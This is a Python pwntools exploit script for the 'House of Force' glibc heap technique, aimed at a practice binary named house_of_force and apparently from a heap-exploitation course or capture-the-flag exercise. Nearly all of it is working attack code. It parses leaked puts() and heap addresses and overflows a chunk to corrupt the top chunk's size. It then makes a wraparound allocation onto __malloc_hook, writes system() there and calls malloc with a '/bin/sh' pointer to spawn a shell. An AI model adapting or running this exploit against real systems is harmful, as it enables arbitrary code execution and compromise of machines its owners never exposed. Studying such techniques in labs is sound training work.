#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_force")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Select the "malloc" option; send size & data.
def malloc(size, data):
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# Request a chunk; overflow its user data and overwrite the top chunk's size field with a large value.
# Write a "/bin/sh" string here if not using the one in libc.
malloc(24, b"/bin/sh\0" + b"Y"*16 + p64(0xfffffffffffffff1))

# Make a very large request that spans the gap between the top chunk and the malloc hook.
# Target the malloc hook because the designer can't explicitly call free().
malloc((libc.sym.__malloc_hook - 0x20) - (heap + 0x20), b"Y")

# The next chunk to be requested overlaps the malloc hook; overwrite it with the address of system().
malloc(24, p64(libc.sym.system))


# ---  OPTION 1  ---

# Call malloc() with the address of the string "/bin/sh" in libc as its argument to trigger system("/bin/sh").
malloc(next(libc.search(b"/bin/sh")), b"")


# ---  OPTION 2  ---

# Alternatively, call malloc() with the address of a "/bin/sh" string on the heap as its argument.
#malloc(heap + 0x10, b"")

# =============================================================================

io.interactive()
